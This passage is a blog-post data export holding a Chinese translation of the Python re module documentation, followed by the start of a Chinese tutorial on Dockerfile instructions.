<code>(?…)</code> 内联标记，隐性标记比如 <code>UNICODE</code> 的结合。</p>\n\n<p><code>Pattern.</code><code>groups</code></p>\n\n<p>捕获组合的数量。</p>\n\n<p><code>Pattern.</code><code>groupindex</code></p>\n\n<p>映射由 <code>(?P&lt;id&gt;)</code> 定义的命名符号组合和数字组合的字典。如果没有符号组，那字典就是空的。</p>\n\n<p><code>Pattern.</code><code>pattern</code></p>\n\n<p>编译对象的原始样式字符串。</p>\n\n<p>在 3.7 版更改: 添加 <a href=\"https://docs.python.org/zh-cn/3.7/library/copy.html#copy.copy\" rel=\"nofollow\"><code>copy.copy()</code></a> 和 <a href=\"https://docs.python.org/zh-cn/3.7/library/copy.html#copy.deepcopy\" rel=\"nofollow\"><code>copy.deepcopy()</code></a> 函数的支持。编译后的正则表达式对象被认为是原子性的。</p>\n\n<h2>匹配对象</h2>\n\n<p>匹配对象总是有一个布尔值 <code>True</code>。如果没有匹配的话 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.Pattern.match\" rel=\"nofollow\"><code>match()</code></a> 和 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.Pattern.search\" rel=\"nofollow\"><code>search()</code></a> 返回 <code>None</code> 所以你可以简单的用 <code>if</code> 语句来判断是否匹配</p>\n\n<pre>\nmatch = re.search(pattern, string)\nif match:\n    process(match)\n</pre>\n\n<p>匹配对象支持以下方法和属性：</p>\n\n<p><code>Match.</code><code>expand</code>(<em>template</em>)</p>\n\n<p>对 <em>template</em> 进行反斜杠转义替换并且返回，就像 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.Pattern.sub\" rel=\"nofollow\"><code>sub()</code></a> 方法中一样。转义如同 <code>\\n</code> 被转换成合适的字符，数字引用(<code>\\1</code>, <code>\\2</code>)和命名组合(<code>\\g&lt;1&gt;</code>, <code>\\g&lt;name&gt;</code>) 替换为相应组合的内容。</p>\n\n<p>在 3.5 版更改: 不匹配的组合替换为空字符串。</p>\n\n<p><code>Match.</code><code>group</code>([<em>group1</em>, <em>...</em>])</p>\n\n<p>返回一个或者多个匹配的子组。如果只有一个参数，结果就是一个字符串，如果有多个参数，结果就是一个元组（每个参数对应一个项），如果没有参数，组1默认到0（整个匹配都被返回）。 如果一个组N 参数值为 0，相应的返回值就是整个匹配字符串；如果它是一个范围 [1..99]，结果就是相应的括号组字符串。如果一个组号是负数，或者大于样式中定义的组数，一个 <a href=\"https://docs.python.org/zh-cn/3.7/library/exceptions.html#IndexError\" rel=\"nofollow\"><code>IndexError</code></a> 索引错误就 <code>raise</code>。如果一个组包含在样式的一部分，并被匹配多次，就返回最后一个匹配。:</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; m = re.match(r\"(\\w+) (\\w+)\", \"Isaac Newton, physicist\")\n&gt;&gt;&gt; m.group(0)       # The entire match\n'Isaac Newton'\n&gt;&gt;&gt; m.group(1)       # The first parenthesized subgroup.\n'Isaac'\n&gt;&gt;&gt; m.group(2)       # The second parenthesized subgroup.\n'Newton'\n&gt;&gt;&gt; m.group(1, 2)    # Multiple arguments give us a tuple.\n('Isaac', 'Newton')\n</pre>\n\n<p>如果正则表达式使用了 <code>(?P&lt;name&gt;…)</code> 语法， <em>groupN</em> 参数就也可能是命名组合的名字。如果一个字符串参数在样式中未定义为组合名，一个 <a href=\"https://docs.python.org/zh-cn/3.7/library/exceptions.html#IndexError\" rel=\"nofollow\"><code>IndexError</code></a> 就 <code>raise</code>。</p>\n\n<p>一个相对复杂的例子</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; m = re.match(r\"(?P&lt;first_name&gt;\\w+) (?P&lt;last_name&gt;\\w+)\", \"Malcolm Reynolds\")\n&gt;&gt;&gt; m.group('first_name')\n'Malcolm'\n&gt;&gt;&gt; m.group('last_name')\n'Reynolds'\n</pre>\n\n<p>命名组合同样可以通过索引值引用</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; m.group(1)\n'Malcolm'\n&gt;&gt;&gt; m.group(2)\n'Reynolds'\n</pre>\n\n<p>如果一个组匹配成功多次，就只返回最后一个匹配</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; m = re.match(r\"(..)+\", \"a1b2c3\")  # Matches 3 times.\n&gt;&gt;&gt; m.group(1)                        # Returns only the last match.\n'c3'\n</pre>\n\n<p><code>Match.</code><code>__getitem__</code>(<em>g</em>)</p>\n\n<p>这个等价于 <code>m.group(g)</code>。这允许更方便的引用一个匹配</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; m = re.match(r\"(\\w+) (\\w+)\", \"Isaac Newton, physicist\")\n&gt;&gt;&gt; m[0]       # The entire match\n'Isaac Newton'\n&gt;&gt;&gt; m[1]       # The first parenthesized subgroup.\n'Isaac'\n&gt;&gt;&gt; m[2]       # The second parenthesized subgroup.\n'Newton'\n</pre>\n\n<p>3.6 新版功能.</p>\n\n<p><code>Match.</code><code>groups</code>(<em>default=None</em>)</p>\n\n<p>返回一个元组，包含所有匹配的子组，在样式中出现的从1到任意多的组合。 <em>default</em> 参数用于不参与匹配的情况，默认为 <code>None</code>。</p>\n\n<p>例如</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; m = re.match(r\"(\\d+)\\.(\\d+)\", \"24.1632\")\n&gt;&gt;&gt; m.groups()\n('24', '1632')\n</pre>\n\n<p>如果我们使小数点可选，那么不是所有的组都会参与到匹配当中。这些组合默认会返回一个 <code>None</code> ，除非指定了 <em>default</em> 参数。</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; m = re.match(r\"(\\d+)\\.?(\\d+)?\", \"24\")\n&gt;&gt;&gt; m.groups()      # Second group defaults to None.\n('24', None)\n&gt;&gt;&gt; m.groups('0')   # Now, the second group defaults to '0'.\n('24', '0')\n</pre>\n\n<p><code>Match.</code><code>groupdict</code>(<em>default=None</em>)</p>\n\n<p>返回一个字典，包含了所有的 <em>命名</em> 子组。key就是组名。 <em>default</em> 参数用于不参与匹配的组合；默认为 <code>None</code>。 例如</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; m = re.match(r\"(?P&lt;first_name&gt;\\w+) (?P&lt;last_name&gt;\\w+)\", \"Malcolm Reynolds\")\n&gt;&gt;&gt; m.groupdict()\n{'first_name': 'Malcolm', 'last_name': 'Reynolds'}\n</pre>\n\n<p><code>Match.</code><code>start</code>([<em>group</em>])</p>\n\n<p><code>Match.</code><code>end</code>([<em>group</em>])</p>\n\n<p>返回 <em>group</em> 匹配到的字串的开始和结束标号。<em>group</em> 默认为0（意思是整个匹配的子串）。如果 <em>group</em> 存在，但未产生匹配，就返回 <code>-1</code> 。对于一个匹配对象 <em>m</em>， 和一个未参与匹配的组 <em>g</em> ，组 <em>g</em> (等价于 <code>m.group(g)</code>)产生的匹配是</p>\n\n<pre>\nm.string[m.start(g):m.end(g)]\n</pre>\n\n<p>注意 <code>m.start(group)</code> 将会等于 <code>m.end(group)</code> ，如果 <em>group</em> 匹配一个空字符串的话。比如，在 <code>m =re.search('b(c?)', 'cba')</code> 之后，<code>m.start(0)</code> 为 1, <code>m.end(0)</code> 为 2, <code>m.start(1)</code> 和 <code>m.end(1)</code> 都是 2, <code>m.start(2)</code> raise 一个 <a href=\"https://docs.python.org/zh-cn/3.7/library/exceptions.html#IndexError\" rel=\"nofollow\"><code>IndexError</code></a> 例外。</p>\n\n<p>这个例子会从email地址中移除掉 <em>remove_this</em></p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; email = \"tony@tiremove_thisger.net\"\n&gt;&gt;&gt; m = re.search(\"remove_this\", email)\n&gt;&gt;&gt; email[:m.start()] + email[m.end():]\n'tony@tiger.net'\n</pre>\n\n<p><code>Match.</code><code>span</code>([<em>group</em>])</p>\n\n<p>对于一个匹配 <em>m</em> ， 返回一个二元组 <code>(m.start(group), m.end(group))</code> 。 注意如果 <em>group</em> 没有在这个匹配中，就返回 <code>(-1, -1)</code> 。<em>group</em> 默认为0，就是整个匹配。</p>\n\n<p><code>Match.</code><code>pos</code></p>\n\n<p><em>pos</em> 的值，会传递给 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.Pattern.search\" rel=\"nofollow\"><code>search()</code></a> 或 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.Pattern.match\" rel=\"nofollow\"><code>match()</code></a> 的方法 a <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re-objects\" rel=\"nofollow\">正则对象</a> 。这个是正则引擎开始在字符串搜索一个匹配的索引位置。</p>\n\n<p><code>Match.</code><code>endpos</code></p>\n\n<p><em>endpos</em> 的值，会传递给 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.Pattern.search\" rel=\"nofollow\"><code>search()</code></a> 或 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.Pattern.match\" rel=\"nofollow\"><code>match()</code></a> 的方法 a <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re-objects\" rel=\"nofollow\">正则对象</a> 。这个是正则引擎停止在字符串搜索一个匹配的索引位置。</p>\n\n<p><code>Match.</code><code>lastindex</code></p>\n\n<p>捕获组的最后一个匹配的整数索引值，或者 <code>None</code> 如果没有匹配产生的话。比如，对于字符串 <code>'ab'</code>，表达式 <code>(a)b</code>, <code>((a)(b))</code>, 和 <code>((ab))</code> 将得到 <code>lastindex == 1</code> ， 而 <code>(a)(b)</code> 会得到 <code>lastindex == 2</code> 。</p>\n\n<p><code>Match.</code><code>lastgroup</code></p>\n\n<p>最后一个匹配的命名组名字，或者 <code>None</code> 如果没有产生匹配的话。</p>\n\n<p><code>Match.</code><code>re</code></p>\n\n<p>返回产生这个实例的 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re-objects\" rel=\"nofollow\">正则对象</a> ， 这个实例是由 正则对象的 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.Pattern.match\" rel=\"nofollow\"><code>match()</code></a> 或 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.Pattern.search\" rel=\"nofollow\"><code>search()</code></a> 方法产生的。</p>\n\n<p><code>Match.</code><code>string</code></p>\n\n<p>传递到 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.Pattern.match\" rel=\"nofollow\"><code>match()</code></a> 或 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.Pattern.search\" rel=\"nofollow\"><code>search()</code></a> 的字符串。</p>\n\n<p>在 3.7 版更改: 添加了对 <a href=\"https://docs.python.org/zh-cn/3.7/library/copy.html#copy.copy\" rel=\"nofollow\"><code>copy.copy()</code></a> 和 <a href=\"https://docs.python.org/zh-cn/3.7/library/copy.html#copy.deepcopy\" rel=\"nofollow\"><code>copy.deepcopy()</code></a> 的支持。匹配对象被看作是原子性的。</p>\n\n<h2>正则表达式例子</h2>\n\n<h3>检查对子</h3>\n\n<p>在这个例子里，我们使用以下辅助函数来更好的显示匹配对象：</p>\n\n<pre>\ndef displaymatch(match):\n    if match is None:\n        return None\n    return '&lt;Match: %r, groups=%r&gt;' % (match.group(), match.groups())\n</pre>\n\n<p>假设你在写一个扑克程序，一个玩家的一手牌为五个字符的串，每个字符表示一张牌，\"a\" 就是 A, \"k\" K， \"q\" Q, \"j\" J, \"t\" 为 10, \"2\" 到 \"9\" 表示2 到 9。</p>\n\n<p>要看给定的字符串是否有效，我们可以按照以下步骤</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; valid = re.compile(r\"^[a2-9tjqk]{5}$\")\n&gt;&gt;&gt; displaymatch(valid.match(\"akt5q\"))  # Valid.\n\"&lt;Match: 'akt5q', groups=()&gt;\"\n&gt;&gt;&gt; displaymatch(valid.match(\"akt5e\"))  # Invalid.\n&gt;&gt;&gt; displaymatch(valid.match(\"akt\"))    # Invalid.\n&gt;&gt;&gt; displaymatch(valid.match(\"727ak\"))  # Valid.\n\"&lt;Match: '727ak', groups=()&gt;\"\n</pre>\n\n<p>最后一手牌，<code>\"727ak\"</code> ，包含了一个对子，或者两张同样数值的牌。要用正则表达式匹配它，应该使用向后引用如下</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; pair = re.compile(r\".*(.).*\\1\")\n&gt;&gt;&gt; displaymatch(pair.match(\"717ak\"))     # Pair of 7s.\n\"&lt;Match: '717', groups=('7',)&gt;\"\n&gt;&gt;&gt; displaymatch(pair.match(\"718ak\"))     # No pairs.\n&gt;&gt;&gt; displaymatch(pair.match(\"354aa\"))     # Pair of aces.\n\"&lt;Match: '354aa', groups=('a',)&gt;\"\n</pre>\n\n<p>要找到对子包含的是哪一张牌，应该按照下面的方式使用 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.Match.group\" rel=\"nofollow\"><code>group()</code></a> 方法:</p>\n\n<pre>\n&gt;&gt;&gt; pair.match(\"717ak\").group(1)\n'7'\n\n# Error because re.match() returns None, which doesn't have a group() method:\n&gt;&gt;&gt; pair.match(\"718ak\").group(1)\nTraceback (most recent call last):\n  File \"&lt;pyshell#23&gt;\", line 1, in &lt;module&gt;\n    re.match(r\".*(.).*\\1\", \"718ak\").group(1)\nAttributeError: 'NoneType' object has no attribute 'group'\n\n&gt;&gt;&gt; pair.match(\"354aa\").group(1)\n'a'\n</pre>\n\n<h3>模拟 scanf()</h3>\n\n<p id=\"index-38\">Python 目前没有一个类似c函数 <code>scanf()</code> 的替代品。正则表达式通常比 <code>scanf()</code> 格式字符串要更强大一些，但也带来更多复杂性。下面的表格提供了 <code>scanf()</code> 格式符和正则表达式大致相同的映射。</p>\n\n<table border=\"1\"><thead><tr><th><code>scanf()</code> 格式符</th>\n\t\t\t<th>正则表达式</th>\n\t\t</tr></thead><tbody><tr><td><code>%c</code></td>\n\t\t\t<td><code>.</code></td>\n\t\t</tr><tr><td><code>%5c</code></td>\n\t\t\t<td><code>.{5}</code></td>\n\t\t</tr><tr><td><code>%d</code></td>\n\t\t\t<td><code>[-+]?\\d+</code></td>\n\t\t</tr><tr><td><code>%e</code>, <code>%E</code>, <code>%f</code>, <code>%g</code></td>\n\t\t\t<td><code>[-+]?(\\d+(\\.\\d*)?|\\.\\d+)([eE][-+]?\\d+)?</code></td>\n\t\t</tr><tr><td><code>%i</code></td>\n\t\t\t<td><code>[-+]?(0[xX][\\dA-Fa-f]+|0[0-7]*|\\d+)</code></td>\n\t\t</tr><tr><td><code>%o</code></td>\n\t\t\t<td><code>[-+]?[0-7]+</code></td>\n\t\t</tr><tr><td><code>%s</code></td>\n\t\t\t<td><code>\\S+</code></td>\n\t\t</tr><tr><td><code>%u</code></td>\n\t\t\t<td><code>\\d+</code></td>\n\t\t</tr><tr><td><code>%x</code>, <code>%X</code></td>\n\t\t\t<td><code>[-+]?(0[xX])?[\\dA-Fa-f]+</code></td>\n\t\t</tr></tbody></table><p>从文件名和数字提取字符串</p>\n\n<pre>\n/usr/sbin/sendmail - 0 errors, 4 warnings\n</pre>\n\n<p>你可以使用 <code>scanf()</code> 格式化</p>\n\n<pre>\n%s - %d errors, %d warnings\n</pre>\n\n<p>等价的正则表达式是：</p>\n\n<pre>\n(\\S+) - (\\d+) errors, (\\d+) warnings\n</pre>\n\n<h3>search() vs. match()</h3>\n\n<p>Python 提供了两种不同的操作：基于 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.match\" rel=\"nofollow\"><code>re.match()</code></a> 检查字符串开头，或者 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.search\" rel=\"nofollow\"><code>re.search()</code></a> 检查字符串的任意位置（默认Perl中的行为）。</p>\n\n<p>例如</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; re.match(\"c\", \"abcdef\")    # No match\n&gt;&gt;&gt; re.search(\"c\", \"abcdef\")   # Match\n&lt;re.Match object; span=(2, 3), match='c'&gt;\n</pre>\n\n<p>在 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.search\" rel=\"nofollow\"><code>search()</code></a> 中，可以用 <code>'^'</code> 作为开始来限制匹配到字符串的首位</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; re.match(\"c\", \"abcdef\")    # No match\n&gt;&gt;&gt; re.search(\"^c\", \"abcdef\")  # No match\n&gt;&gt;&gt; re.search(\"^a\", \"abcdef\")  # Match\n&lt;re.Match object; span=(0, 1), match='a'&gt;\n</pre>\n\n<p>注意 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.MULTILINE\" rel=\"nofollow\"><code>MULTILINE</code></a> 多行模式中函数 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.match\" rel=\"nofollow\"><code>match()</code></a> 只匹配字符串的开始，但使用 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.search\" rel=\"nofollow\"><code>search()</code></a> 和以 <code>'^'</code> 开始的正则表达式会匹配每行的开始</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; re.match('X', 'A\\nB\\nX', re.MULTILINE)  # No match\n&gt;&gt;&gt; re.search('^X', 'A\\nB\\nX', re.MULTILINE)  # Match\n&lt;re.Match object; span=(4, 5), match='X'&gt;\n</pre>\n\n<h3>建立一个电话本</h3>\n\n<p><a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.split\" rel=\"nofollow\"><code>split()</code></a> 将字符串用参数传递的样式分隔开。这个方法对于转换文本数据到易读而且容易修改的数据结构，是很有用的，如下面的例子证明。</p>\n\n<p>首先，这里是输入。通常是一个文件，这里我们用三引号字符串语法</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; text = \"\"\"Ross McFluff: 834.345.1254 155 Elm Street\n...\n... Ronald Heathmore: 892.345.3428 436 Finley Avenue\n... Frank Burger: 925.541.7625 662 South Dogwood Way\n...\n...\n... Heather Albrecht: 548.326.4584 919 Park Place\"\"\"\n</pre>\n\n<p>条目用一个或者多个换行符分开。现在我们将字符串转换为一个列表，每个非空行都有一个条目:</p>\n\n<pre>\n&gt;&gt;&gt; entries = re.split(\"\\n+\", text)\n&gt;&gt;&gt; entries\n['Ross McFluff: 834.345.1254 155 Elm Street',\n'Ronald Heathmore: 892.345.3428 436 Finley Avenue',\n'Frank Burger: 925.541.7625 662 South Dogwood Way',\n'Heather Albrecht: 548.326.4584 919 Park Place']\n</pre>\n\n<p>最终，将每个条目分割为一个由名字、姓氏、电话号码和地址组成的列表。我们为 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.split\" rel=\"nofollow\"><code>split()</code></a> 使用了 <code>maxsplit</code> 形参，因为地址中包含有被我们作为分割模式的空格符:</p>\n\n<pre>\n&gt;&gt;&gt; [re.split(\":? \", entry, 3) for entry in entries]\n[['Ross', 'McFluff', '834.345.1254', '155 Elm Street'],\n['Ronald', 'Heathmore', '892.345.3428', '436 Finley Avenue'],\n['Frank', 'Burger', '925.541.7625', '662 South Dogwood Way'],\n['Heather', 'Albrecht', '548.326.4584', '919 Park Place']]\n</pre>\n\n<p><code>:?</code> 样式匹配姓后面的冒号，因此它不出现在结果列表中。如果 <code>maxsplit</code> 设置为 <code>4</code> ，我们还可以从地址中获取到房间号:</p>\n\n<pre>\n&gt;&gt;&gt; [re.split(\":? \", entry, 4) for entry in entries]\n[['Ross', 'McFluff', '834.345.1254', '155', 'Elm Street'],\n['Ronald', 'Heathmore', '892.345.3428', '436', 'Finley Avenue'],\n['Frank', 'Burger', '925.541.7625', '662', 'South Dogwood Way'],\n['Heather', 'Albrecht', '548.326.4584', '919', 'Park Place']]\n</pre>\n\n<h3>文字整理</h3>\n\n<p><a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.sub\" rel=\"nofollow\"><code>sub()</code></a> 替换字符串中出现的样式的每一个实例。这个例子证明了使用 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.sub\" rel=\"nofollow\"><code>sub()</code></a> 来整理文字，或者随机化每个字符的位置，除了首位和末尾字符</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; def repl(m):\n...     inner_word = list(m.group(2))\n...     random.shuffle(inner_word)\n...     return m.group(1) + \"\".join(inner_word) + m.group(3)\n&gt;&gt;&gt; text = \"Professor Abdolmalek, please report your absences promptly.\"\n&gt;&gt;&gt; re.sub(r\"(\\w)(\\w+)(\\w)\", repl, text)\n'Poefsrosr Aealmlobdk, pslaee reorpt your abnseces plmrptoy.'\n&gt;&gt;&gt; re.sub(r\"(\\w)(\\w+)(\\w)\", repl, text)\n'Pofsroser Aodlambelk, plasee reoprt yuor asnebces potlmrpy.'\n</pre>\n\n<h3>找到所有副词</h3>\n\n<p><a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.findall\" rel=\"nofollow\"><code>findall()</code></a> 匹配样式 <em>所有</em> 的出现，不仅是像 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.search\" rel=\"nofollow\"><code>search()</code></a> 中的第一个匹配。比如，如果一个作者希望找到文字中的所有副词，他可能会按照以下方法用 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.findall\" rel=\"nofollow\"><code>findall()</code></a></p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; text = \"He was carefully disguised but captured quickly by police.\"\n&gt;&gt;&gt; re.findall(r\"\\w+ly\", text)\n['carefully', 'quickly']\n</pre>\n\n<h3>找到所有副词和位置</h3>\n\n<p>如果需要匹配样式的更多信息， <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.finditer\" rel=\"nofollow\"><code>finditer()</code></a> 可以起到作用，它提供了 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#match-objects\" rel=\"nofollow\">匹配对象</a> 作为返回值，而不是字符串。继续上面的例子，如果一个作者希望找到所有副词和它的位置，可以按照下面方法使用 <a href=\"https://docs.python.org/zh-cn/3.7/library/re.html#re.finditer\" rel=\"nofollow\"><code>finditer()</code></a></p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; text = \"He was carefully disguised but captured quickly by police.\"\n&gt;&gt;&gt; for m in re.finditer(r\"\\w+ly\", text):\n...     print('%02d-%02d: %s' % (m.start(), m.end(), m.group(0)))\n07-16: carefully\n40-47: quickly\n</pre>\n\n<h3>原始字符记法</h3>\n\n<p>原始字符串记法 (<code>r\"text\"</code>) 保持正则表达式正常。否则，每个正则式里的反斜杠(<code>'\\'</code>) 都必须前缀一个反斜杠来转义。比如，下面两行代码功能就是完全一致的</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; re.match(r\"\\W(.)\\1\\W\", \" ff \")\n&lt;re.Match object; span=(0, 4), match=' ff '&gt;\n&gt;&gt;&gt; re.match(\"\\\\W(.)\\\\1\\\\W\", \" ff \")\n&lt;re.Match object; span=(0, 4), match=' ff '&gt;\n</pre>\n\n<p>当需要匹配一个字符反斜杠，它必须在正则表达式中转义。在原始字符串记法，就是 <code>r\"\\\\\"</code>。否则就必须用 <code>\"\\\\\\\\\"</code>，来表示同样的意思</p>\n\n<p>&gt;&gt;&gt;</p>\n\n<pre>\n&gt;&gt;&gt; re.match(r\"\\\\\", r\"\\\\\")\n&lt;re.Match object; span=(0, 1), match='\\\\'&gt;\n&gt;&gt;&gt; re.match(\"\\\\\\\\\", r\"\\\\\")\n&lt;re.Match object; span=(0, 1), match='\\\\'&gt;\n</pre>\n\n<h3>写一个词法分析器</h3>\n\n<p>一个 <a href=\"https://en.wikipedia.org/wiki/Lexical_analysis\" rel=\"nofollow\">词法器或词法分析器</a> 分析字符串，并分类成目录组。 这是写一个编译器或解释器的第一步。</p>\n\n<p>文字目录是由正则表达式指定的。这个技术是通过将这些样式合并为一个主正则式，并且循环匹配来实现的</p>\n\n<pre>\nimport collections\nimport re\n\nToken = collections.namedtuple('Token', ['type', 'value', 'line', 'column'])\n\ndef tokenize(code):\n    keywords = {'IF', 'THEN', 'ENDIF', 'FOR', 'NEXT', 'GOSUB', 'RETURN'}\n    token_specification = [\n        ('NUMBER',   r'\\d+(\\.\\d*)?'),  # Integer or decimal number\n        ('ASSIGN',   r':='),           # Assignment operator\n        ('END',      r';'),            # Statement terminator\n        ('ID',       r'[A-Za-z]+'),    # Identifiers\n        ('OP',       r'[+\\-*/]'),      # Arithmetic operators\n        ('NEWLINE',  r'\\n'),           # Line endings\n        ('SKIP',     r'[ \\t]+'),       # Skip over spaces and tabs\n        ('MISMATCH', r'.'),            # Any other character\n    ]\n    tok_regex = '|'.join('(?P&lt;%s&gt;%s)' % pair for pair in token_specification)\n    line_num = 1\n    line_start = 0\n    for mo in re.finditer(tok_regex, code):\n        kind = mo.lastgroup\n        value = mo.group()\n        column = mo.start() - line_start\n        if kind == 'NUMBER':\n            value = float(value) if '.' in value else int(value)\n        elif kind == 'ID' and value in keywords:\n            kind = value\n        elif kind == 'NEWLINE':\n            line_start = mo.end()\n            line_num += 1\n            continue\n        elif kind == 'SKIP':\n            continue\n        elif kind == 'MISMATCH':\n            raise RuntimeError(f'{value!r} unexpected on line {line_num}')\n        yield Token(kind, value, line_num, column)\n\nstatements = '''\n    IF quantity THEN\n        total := total + price * quantity;\n        tax := price * 0.05;\n    ENDIF;\n'''\n\nfor token in tokenize(statements):\n    print(token)\n</pre>\n\n<p>这个词法器产生以下输出</p>\n\n<pre>\nToken(type='IF', value='IF', line=2, column=4)\nToken(type='ID', value='quantity', line=2, column=7)\nToken(type='THEN', value='THEN', line=2, column=16)\nToken(type='ID', value='total', line=3, column=8)\nToken(type='ASSIGN', value=':=', line=3, column=14)\nToken(type='ID', value='total', line=3, column=17)\nToken(type='OP', value='+', line=3, column=23)\nToken(type='ID', value='price', line=3, column=25)\nToken(type='OP', value='*', line=3, column=31)\nToken(type='ID', value='quantity', line=3, column=33)\nToken(type='END', value=';', line=3, column=41)\nToken(type='ID', value='tax', line=4, column=8)\nToken(type='ASSIGN', value=':=', line=4, column=12)\nToken(type='ID', value='price', line=4, column=15)\nToken(type='OP', value='*', line=4, column=21)\nToken(type='NUMBER', value=0.05, line=4, column=23)\nToken(type='END', value=';', line=4, column=27)\nToken(type='ENDIF', value='ENDIF', line=5, column=4)\nToken(type='END', value=';', line=5, column=9)</pre>\n                                    </div>", "log_PostTime": 1584891094, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Dockerfile的详解", "log_Intro": "Dockerfile的详解", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2>什么是dockerfile?</h2>\n\n<p>Dockerfile是一个包含用于组合映像的命令的文本文档。可以使用在命令行中调用任何命令。 Docker通过读取<code>Dockerfile</code>中的指令自动生成映像。</p>\n\n<p><code>docker build</code>命令用于从Dockerfile构建映像。可以在<code>docker build</code>命令中使用<code>-f</code>标志指向文件系统中任何位置的Dockerfile。</p>\n\n<p>例：</p>\n\n<pre>\ndocker build -f /path/to/a/Dockerfile</pre>\n\n<h2>Dockerfile的基本结构</h2>\n\n<p>Dockerfile 一般分为四部分：基础镜像信息、维护者信息、镜像操作指令和容器启动时执行指令，’#’ 为 Dockerfile 中的注释。</p>\n\n<h2 id=\"h2-dockerfile-\">Dockerfile文件说明</h2>\n\n<p>Docker以从上到下的顺序运行Dockerfile的指令。为了指定基本映像，第一条指令必须是<em>FROM</em>。一个声明以<code>＃</code>字符开头则被视为注释。可以在Docker文件中使用<code>RUN</code>，<code>CMD</code>，<code>FROM</code>，<code>EXPOSE</code>，<code>ENV</code>等指令。</p>\n\n<p><strong>在这里列出了一些常用的指令。</strong></p>\n\n<p id=\"from\"><strong>FROM：指定基础镜像，必须为第一个命令</strong></p>\n\n<pre>\n格式：\n　　FROM &lt;image&gt;\n　　FROM &lt;image&gt;:&lt;tag&gt;\n　　FROM &lt;image&gt;@&lt;digest&gt;\n示例：\n　　FROM mysql:5.6\n注：\n　　tag或digest是可选的，如果不使用这两个值时，会使用latest版本的基础镜像</pre>\n\n<p><strong>MAINTAINER: 维护者信息</strong></p>\n\n<pre>\n格式：\n    MAINTAINER &lt;name&gt;\n示例：\n    MAINTAINER Jasper Xu\n    MAINTAINER sorex@163.com\n    MAINTAINER Jasper Xu &lt;sorex@163.com&gt;</pre>\n\n<p><strong>RUN：构建镜像时执行的命令</strong></p>\n\n<pre>\nRUN用于在镜像容器中执行命令，其有以下两种命令执行方式：\n<strong>shell执行</strong>\n格式：\n    RUN &lt;command&gt;<strong>\nexec执行</strong>\n格式：\n    RUN [\"executable\", \"param1\", \"param2\"]\n示例：\n    RUN [\"executable\", \"param1\", \"param2\"]\n    RUN apk update\n    RUN [\"/etc/execfile\", \"arg1\", \"arg1\"]\n注：\n　　RUN指令创建的中间镜像会被缓存，并会在下次构建中使用。如果不想使用这些缓存镜像，可以在构建时指定--no-cache参数，如：docker build --no-cache</pre>\n\n<p><strong>ADD：将本地文件添加到容器中，tar类型文件会自动解压(网络压缩资源不会被解压)，可以访问网络资源，类似wget</strong></p>\n\n<pre>\n格式：\n    ADD &lt;src&gt;... &lt;dest&gt;\n    ADD [\"&lt;src&gt;\",... \"&lt;dest&gt;\"] 用于支持包含空格的路径\n示例：\n    ADD hom* /mydir/          # 添加所有以\"hom\"开头的文件\n    ADD hom?.txt /mydir/      # ? 替代一个单字符,例如：\"home.txt\"\n    ADD test relativeDir/     # 添加 \"test\" 到 `WORKDIR`/relativeDir/\n    ADD test 